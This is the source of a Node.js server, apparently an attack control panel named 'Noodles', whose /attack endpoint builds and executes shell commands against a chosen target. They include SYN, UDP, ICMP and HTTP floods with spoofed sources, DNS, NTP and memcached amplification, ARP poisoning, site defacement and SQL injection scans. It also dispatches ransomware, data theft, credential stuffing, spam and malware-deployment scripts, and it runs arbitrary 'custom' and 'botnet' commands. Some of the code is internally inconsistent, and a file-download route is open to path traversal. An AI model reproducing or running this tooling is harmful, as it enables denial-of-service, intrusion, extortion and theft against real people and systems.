const express = require('express');
const app = express();
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const publicIp = require('public-ip');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const promClient = require('prom-client');
const { networkInterfaces } = require('os');
const si = require('systeminformation');
const dns = require('dns');
const net = require('net');
const { spawn } = require('child_process');
const cors = require('cors');
const cluster = require('cluster');
const numCPUs = os.cpus().length;
const WebSocket = require('ws');
const helmet = require('helmet');
const morgan = require('morgan');
const sanitize = require('sanitize-html');
const validator = require('validator');

// Security Enhancements
app.use(helmet({
    frameguard: { action: 'deny' },
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", 'data:'],
            connectSrc: ["'self'", 'ws://localhost:8080', 'ws://127.0.0.1:8080'],
        },
    },
    hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
    xssFilter: true,
    noSniff: true,
    ieNoOpen: true,
}));
app.disable('x-powered-by');

const accessLogStream = fs.createWriteStream(path.join(__dirname, 'access.log'), { flags: 'a' });
app.use(morgan('combined', { stream: accessLogStream }));

app.use(cors());
app.use(express.static('public', {
    setHeaders: (res, path) => {
        if (path.endsWith('.js')) {
            res.setHeader('Content-Type', 'application/javascript');
        }
    }
}));
app.use(express.urlencoded({ extended: true }));
app.use(express.json({ limit: '100kb' }));

const logFilePath = path.join(__dirname, 'logs.txt');
const apiKey = crypto.randomBytes(32).toString('hex');
const registry = new promClient.Registry();
const wss = new WebSocket.Server({ port: 8080 });

const attackCounter = new promClient.Counter({
    name: 'noodles_attacks_total',
    help: 'Total number of attacks launched',
    labelNames: ['attackType', 'target'],
    registers: [registry]
});

const attackDurationGauge = new promClient.Gauge({
    name: 'noodles_attack_duration_seconds',
    help: 'Duration of the last attack in seconds',
    labelNames: ['attackType', 'target'],
    registers: [registry]
});

const attackIntensityGauge = new promClient.Gauge({
    name: 'noodles_attack_intensity',
    help: 'Intensity of the last attack',
    labelNames: ['attackType', 'target'],
    registers: [registry]
});

const log = (message) => {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}\n`;
    fs.appendFile(logFilePath, logMessage, (err) => {
        if (err) console.error('Failed to write to log:', err);
    });
    console.log(logMessage.trim());
    if (wss && wss.clients) {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                try {
                    client.send(JSON.stringify({ type: 'log', message: logMessage.trim() }));
                } catch (e) {
                    console.error("WebSocket error:", e);
                }

            }
        });
    }
};

const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 50,
    message: 'Too many requests, try again after 15 minutes',
    standardHeaders: true,
    legacyHeaders: false,
});

app.use('/attack', apiLimiter);

function getNetworkInterface() {
    const interfaces = networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (!iface.internal && iface.family === 'IPv4') {
                return name;
            }
        }
    }
    return null;
}

async function getSystemStats() {
    try {
        const cpu = await si.cpu();
        const mem = await si.mem();
        const osInfo = await si.osInfo();
        const disk = await si.diskLayout();
        const network = await si.networkInterfaces();

        return {
            cpu: {
                manufacturer: cpu.manufacturer,
                brand: cpu.brand,
                cores: cpu.cores,
                speed: cpu.speed
            },
            memory: {
                total: mem.total,
                free: mem.free,
                used: mem.used
            },
            os: {
                platform: osInfo.platform,
                distro: osInfo.distro,
                release: osInfo.release
            },
            disk: {
                model: disk.length > 0 ? disk[0].model : 'N/A',
                size: disk.length > 0 ? disk[0].size : 'N/A'
            },
            network: network.map(iface => ({
                iface: iface.iface,
                ip4: iface.ip4,
                ip6: iface.ip6,
                mac: iface.mac
            }))
        };
    } catch (e) {
        console.error('Error getting system stats:', e);
        log(`Error getting system stats: ${e.message}`);
        return { error: e.message };
    }
}

app.get('/system-stats', async (req, res) => {
    const userApiKey = req.headers['x-api-key'];

    if (userApiKey !== apiKey) {
        log('Error: Unauthorized API key for system stats.');
        return res.status(401).send('Unauthorized.');
    }

    const stats = await getSystemStats();
    res.json(stats);
});

function resolveTarget(target) {
    return new Promise((resolve, reject) => {
        if (net.isIP(target)) {
            resolve(target);
        } else {
            dns.resolve4(target, (err, addresses) => {
                if (err) {
                    dns.resolve6(target, (err6, addresses6) => {
                        if (err6) {
                            reject(err);
                        } else {
                            resolve(addresses6[0]);
                        }
                    });
                } else {
                    resolve(addresses[0]);
                }
            });
        }
    });
}

function executeCommand(command) {
    return new Promise((resolve, reject) => {
        exec(command, { maxBuffer: 1024 * 1024 * 10, timeout: 30000 }, (error, stdout, stderr) => {
            if (error) {
                log(`Command execution error: ${error.message}`);
                log(`Command stderr: ${stderr}`);
                reject(error);
                return;
            }
            resolve({ stdout, stderr });
        });
    });
}

function getRandomUserAgent() {
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
        'Noodles-Bot/1.0',
        'Noodles-Attacker/2.0',
        'Hax0r-Agent/3.0',
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

const apiKeyLimiter = rateLimit({
    windowMs: 60 * 60 * 1000,
    max: 5,
    message: 'Too many API key requests, try again after an hour',
    standardHeaders: true,
    legacyHeaders: false,
});

app.get('/api-key', apiKeyLimiter, (req, res) => {
    res.send({ apiKey: apiKey });
});

app.post('/attack', async (req, res) => {
    let target = req.body.target;
    const attackType = req.body.attackType;
    const duration = parseInt(req.body.duration) || 60;
    const intensity = parseInt(req.body.intensity) || 100;
    const userApiKey = req.headers['x-api-key'];
    const bypass = req.body.bypass || false;
    const port = parseInt(req.body.port) || 80;

    if (userApiKey !== apiKey) {
        log('Error: Unauthorized API key.');
        return res.status(401).send('Unauthorized.');
    }

    if (!target) {
        log('Error: Target URL is required.');
        return res.status(400).send('Target URL is required.');
    }

    if (!attackType) {
        log('Error: Attack type is required.');
        return res.status(400).send('Attack type is required.');
    }

    let command = '';
    const numThreads = os.cpus().length * 4;
    let encodedTarget = target;
    const networkInterface = getNetworkInterface();

    attackIntensityGauge.set({ attackType: attackType, target: target }, intensity);

    try {
        if (!net.isIP(target)) {
            target = await resolveTarget(target);
            encodedTarget = target;
        }
    } catch (error) {
        log(`Error resolving target: ${error.message}`);
        return res.status(400).send(`Error resolving target: ${error.message}`);
    }

    if (typeof encodedTarget !== 'string' || !validator.isURL(encodedTarget, { protocols: ['http','https'], require_protocol: true })) {
        log('Error: Invalid target format. Potential command injection attempt.');
        return res.status(400).send('Invalid target format.');
    }

    const sanitizeInput = (input, maxLength = 200) => {
        if (typeof input !== 'string') return '';
        return sanitize(input.substring(0, maxLength));
    };

    switch (attackType) {
        case 'ddos':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -A '${getRandomUserAgent()}' --http1.1 -s -o /dev/null ${encodedTarget}:${port} & done; done"`;
            break;
        case 'deface':
            let defaceScript = sanitize(`<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">`);
            command = `timeout ${duration} bash -c "curl -X PUT -H 'Content-Type: text/html' -d $'${defaceScript}' ${encodedTarget}:${port}/index.html"`;
            break;
        case 'connect':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do nc -v ${encodedTarget} ${port} & done; done"`;
            break;
        case 'tor_ddos':
            try {
                const externalIp = await publicIp.v4();
                log(`Attacker IP: ${externalIp}`);
                command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do proxychains4 curl -A '${getRandomUserAgent()}' -s -o /dev/null ${encodedTarget}:${port} & done; done"`;
            } catch (error) {
                log(`Error getting public IP: ${error.message}`);
                return res.status(500).send(`Error getting public IP: ${error.message}`);
            }
            break;
        case 'sql_inject':
            command = `sqlmap --url "${encodedTarget}" --dbs --batch --level 5 --risk 3`;
            break;
        case 'slowloris':
            command = `timeout ${duration} perl slowloris.pl -dns ${encodedTarget} -port ${port} -num ${intensity * 50}`;
            break;

        case 'udp_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --udp -s ${port} -p ${port} --flood --rand-source ${encodedTarget} & done; done"`;
            break;

        case 'syn_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p ${port} --flood --rand-source ${encodedTarget} & done; done"`;
            break;

        case 'ping_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -f -s 65500 ${encodedTarget} & done; done"`;
            break;

        case 'nuke':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -s 65500 ${encodedTarget} & done; done"`;
            break;

        case 'http_flood':
            command = `timeout ${duration} bash -c "while true; do wrk -t${numThreads} -c${intensity * 10} -d${duration} ${encodedTarget}:${port}; done"`;
            break;

        case 'tcp_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p ${port} --flood --rand-source ${encodedTarget} & done; done"`;
            break;

        case 'spoofed_flood':
            const spoofedIp = generateRandomIP();
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p ${port} -a ${spoofedIp} --flood ${encodedTarget} & done; done"`;
            break;

        case 'icmp_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --flood --rand-source ${encodedTarget} & done; done"`;
            break;

        case 'dns_amp':
            const resolverIp = '8.8.8.8';
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do dig @${resolverIp} ${target} ANY +dnssec & done; done"`;
            break;

        case 'memcached_amp':
            const memcachedServer = '127.0.0.1:11211';
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -en '\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00get stats\\r\\n' | nc -u ${target} 11211 & done; done"`;
            break;

        case 'ntp_amp':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ntpq -n -c monlist ${target} & done; done"`;
            break;

        case 'icmp_smurf':
            const broadcastAddress = target.split('.').slice(0, 3).join('.') + '.255';
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --flood --rand-source -a ${target} ${broadcastAddress} & done; done"`;
            break;

        case 'arp_cache_poisoning':
            if (!networkInterface) {
                log('Error: No suitable network interface found for ARP poisoning.');
                return res.status(500).send('No suitable network interface found.');
            }
            const gatewayIp = '192.168.1.1';
            const victimIp = target;
            const attackerMac = '00:11:22:33:44:55';
            command = `timeout ${duration} bash -c "while true; do arpspoof -i ${networkInterface} -t ${victimIp} ${gatewayIp} & arpspoof -i ${networkInterface} -t ${gatewayIp} ${victimIp} & done"`;
            break;

        case 'slow_read':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do python3 slow_read.py ${encodedTarget}:${port} & done; done"`;
            break;

        case 'pod_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --icmp-ts --flood --rand-source -p ${port} ${encodedTarget} & done; done"`;
            break;

        case 'payload':
            let payload = req.body.payload;
            if (!payload) {
                log('Error: Payload is required for payload attack.');
                return res.status(400).send('Payload is required for payload attack.');
            }

            payload = sanitizeInput(payload, 500);
            command = `timeout ${duration} bash -c "echo '${payload}' | nc ${encodedTarget} ${port}"`;
            break;

        case 'rudy':
            command = `timeout ${duration} python3 rudy.py -t ${encodedTarget} -n ${numThreads} -s ${intensity}`;
            break;

        case 'goldeneye':
            command = `timeout ${duration} python3 goldeneye.py ${encodedTarget} ${numThreads}`;
            break;

        case 'xerxes':
            command = `timeout ${duration} ./xerxes ${encodedTarget} ${numThreads}`;
            break;

        case 'botnet':
            let botCommand = req.body.botCommand;
            if (!botCommand) {
                log('Error: Bot command is required for botnet attack.');
                return res.status(400).send('Bot command is required for botnet attack.');
            }

            botCommand = sanitizeInput(botCommand, 300);
            command = `timeout ${duration} bash -c "${botCommand}"`;
            break;

        case 'raw_tcp':
            let rawPayload = req.body.rawPayload;
            if (!rawPayload) {
                log('Error: Raw TCP payload is required for raw_tcp attack.');
                return res.status(400).send('Raw TCP payload is required for raw_tcp attack.');
            }

            rawPayload = sanitizeInput(rawPayload, 500);
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -ne '${rawPayload}' | nc ${encodedTarget} ${port} & done; done"`;
            break;

        case 'custom':
            let customCommand = req.body.customCommand;
            if (!customCommand) {
                log('Error: Custom command is required for custom attack.');
                return res.status(400).send('Custom command is required for custom attack.');
            }

            log('Warning: Custom command execution enabled.  Exercise extreme caution.');

            customCommand = sanitizeInput(customCommand, 200);
            command = customCommand;
            break;
        case 'layer7':
            let layer7Method = req.body.layer7Method;
            let layer7Options = req.body.layer7Options || '';
            if (!layer7Method) {
                log('Error: Layer7 method is required for layer7 attack.');
                return res.status(400).send('Layer7 method is required for layer7 attack.');
            }

            layer7Method = sanitizeInput(layer7Method, 50);
            layer7Options = sanitizeInput(layer7Options, 100);


            command = `node layer7.js --target ${encodedTarget} --method ${layer7Method} --duration ${duration} --threads ${numThreads} --port ${port} ${layer7Options}`;
            break;

        case 'http_header_injection':
            let headerName = req.body.headerName;
            let headerValue = req.body.headerValue;
            if (!headerName || !headerValue) {
                log('Error: Header name and value are required for HTTP header injection attack.');
                return res.status(400).send('Header name and value are required for HTTP header injection attack.');
            }

            headerName = sanitizeInput(headerName, 50);
            headerValue = sanitizeInput(headerValue, 100);

            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -H '${headerName}: ${headerValue}' ${encodedTarget}:${port} & done; done"`;
            break;

        case 'cc_bypass':
            let ccBypassMethod = req.body.ccBypassMethod;
            let ccBypassData = req.body.ccBypassData;

            if (!ccBypassMethod || !ccBypassData) {
                log('Error: CC Bypass method and data are required');
                return res.status(400).send('CC Bypass method and data are required');
            }

            ccBypassMethod = sanitizeInput(ccBypassMethod, 50);
            ccBypassData = sanitizeInput(ccBypassData, 200);
            command = `timeout ${duration} bash -c "node cc_bypass.js --target ${encodedTarget}:${port} --method ${ccBypassMethod} --data '${ccBypassData}' --threads ${numThreads}"`;
            break;
        case 'device_takeover':
            let deviceCommand = req.body.deviceCommand;

            if (!deviceCommand) {
                log('Error: Device command is required for device takeover');
                return res.status(400).send('Device command is required for device takeover');
            }

            log('Warning: Device takeover commands are extremely dangerous and should only be used in a controlled environment!');

            deviceCommand = sanitizeInput(deviceCommand, 100);
            command = `timeout ${duration} bash -c "${deviceCommand}"`;
            break;
         case 'ransomware':
            let targetDirectory = req.body.targetDirectory;
            let encryptionKey = crypto.randomBytes(32).toString('hex');
            if (!targetDirectory) {
                log('Error: Target directory is required for ransomware attack.');
                return res.status(400).send('Target directory is required for ransomware attack.');
            }

            targetDirectory = sanitizeInput(targetDirectory, 100);
            command = `node ransomware.js --targetDirectory "${targetDirectory}" --encryptionKey "${encryptionKey}"`;
            break;
       case 'data_theft':
            let dataSelector = req.body.dataSelector;
            if (!dataSelector) {
                log('Error: Data selector is required for data theft.');
                return res.status(400).send('Data selector is required for data theft.');
            }
            dataSelector = sanitizeInput(dataSelector, 200);
            command = `node data_theft.js --target "${encodedTarget}" --selector "${dataSelector}"`;
            break;
        case 'email_spam':
            let recipientList = req.body.recipientList;
            let spamSubject = req.body.spamSubject;
            let spamBody = req.body.spamBody;
            if (!recipientList || !spamSubject || !spamBody) {
                log('Error: Recipient list, subject, and body are required for email spam.');
                return res.status(400).send('Recipient list, subject, and body are required for email spam.');
            }

            recipientList = sanitizeInput(recipientList, 500);
            spamSubject = sanitizeInput(spamSubject, 200);
            spamBody = sanitizeInput(spamBody, 1000);
            command = `node email_spam.js --recipients "${recipientList}" --subject "${spamSubject}" --body "${spamBody}"`;
            break;
        case 'credential_stuffing':
            let usernameList = req.body.usernameList;
            let passwordList = req.body.passwordList;

            if (!usernameList || !passwordList) {
                log('Error: Username and password lists are required for credential stuffing.');
                return res.status(400).send('Username and password lists are required for credential stuffing.');
            }

            usernameList = sanitizeInput(usernameList, 500);
            passwordList = sanitizeInput(passwordList, 500);

            command = `node credential_stuffing.js --target "${encodedTarget}" --usernames "${usernameList}" --passwords "${passwordList}"`;
            break;
        case 'zero_day':
            let exploitCode = req.body.exploitCode;
            if (!exploitCode) {
                log('Error: Exploit code is required for zero-day attack.');
                return res.status(400).send('Exploit code is required for zero-day attack.');
            }

            exploitCode = sanitizeInput(exploitCode, 1000);
            command = `node zero_day.js --target "${encodedTarget}" --exploit "${exploitCode}"`;
            break;
        case 'malware_deploy':
            let malwareUrl = req.body.malwareUrl;
            if (!malwareUrl) {
                log('Error: Malware URL is required for malware deployment.');
                return res.status(400).send('Malware URL is required for malware deployment.');
            }

            malwareUrl = sanitizeInput(malwareUrl, 200);
            command = `node malware_deploy.js --target "${encodedTarget}" --url "${malwareUrl}"`;
            break;
        case 'social_engineering':
            let messageContent = req.body.messageContent;

            if (!messageContent) {
                log('Error: Message content is required for social engineering attack.');
                return res.status(400).send('Message content is required for social engineering attack.');
            }

            messageContent = sanitizeInput(messageContent, 1000);
            command = `node social_engineering.js --target "${encodedTarget}" --message "${messageContent}"`;
            break;
        default:
            log(`Error: Invalid attack type: ${attackType}`);
            return res.status(400).send('Invalid attack type.');
    }

    if (command) {
      log(`Initiating ${attackType} attack on ${target} for ${duration} seconds with intensity ${intensity}.`);

      attackCounter.inc({ attackType: attackType, target: target });
      const attackStartTime = Date.now();

      try {
          const { stdout, stderr } = await executeCommand(command);
          const attackEndTime = Date.now();
          const actualDuration = (attackEndTime - attackStartTime) / 1000;
          attackDurationGauge.set({ attackType: attackType, target: target }, actualDuration);

          if (stderr) {
              log(`Attack stderr: ${stderr}`);
          }
          log(`Attack completed. stdout: ${stdout}`);

          if (wss && wss.clients) {
              wss.clients.forEach(client => {
                  if (client.readyState === WebSocket.OPEN) {
                      try {
                          client.send(JSON.stringify({ type: 'attack_result', stdout: stdout, stderr: stderr }));
                      } catch (e) {
                          console.error("WebSocket error:", e);
                      }

                  }
              });
          }

          res.send('Attack initiated. Check logs for details.');
      } catch (error) {
          log(`Attack failed: ${error.message}`);
          console.error(`exec error: ${error}`);

          if (wss && wss.clients) {
              wss.clients.forEach(client => {
                  if (client.readyState === WebSocket.OPEN) {
                      try {
                          client.send(JSON.stringify({ type: 'attack_failed', error: error.message }));
                      } catch (e) {
                          console.error("WebSocket error:", e);
                      }

                  }
              });
          }

          res.status(500).send(`Attack failed: ${error.message}`);
      }
    }
});

function generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

app.get('/logs', (req, res) => {
    fs.readFile(logFilePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Failed to read logs:', err);
            return res.status(500).send('Failed to read logs.');
        }
        res.send(data.split('\n').reverse().join('\n'));
    });
});



app.get('/metrics', async (req, res) => {
    res.setHeader('Content-Type', registry.contentType);
    const metrics = await registry.metrics();
    res.send(metrics);
});

app.get('/download/:file', (req, res) => {
    const file = req.params.file;
    const filePath = path.join(__dirname, file);

    fs.access(filePath, fs.constants.F_OK, (err) => {
        if (err) {
            return res.status(404).send('File not found');
        }

        res.download(filePath);
    });
});

app.use((err, req, res, next) => {
    console.error(err.stack);
    log(`Fatal error: ${err.message}`);
    res.status(500).send('Something broke!');
});

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
    log(`Uncaught Exception: ${err.message}`);
     // Optionally, perform cleanup actions here before exiting
    if (!err.message.includes('EADDRINUSE')) {
        process.exit(1);
    }
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    log(`Unhandled Rejection: ${reason}`);
});

if (wss) {
    wss.on('connection', ws => {
        log('Client connected via WebSocket');
        ws.on('close', () => log('Client disconnected'));
    });
}

const PORT = process.env.PORT || 3000;

if (cluster.isMaster) {
    console.log(`Master ${process.pid} is running`);

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`worker ${worker.process.pid} died`);
        cluster.fork();
    });
} else {
    app.listen(PORT, () => {
        console.log(`Worker ${process.pid} listening on port ${PORT}`);
        log(`Worker ${process.pid} started on port ${PORT}`);
    });
}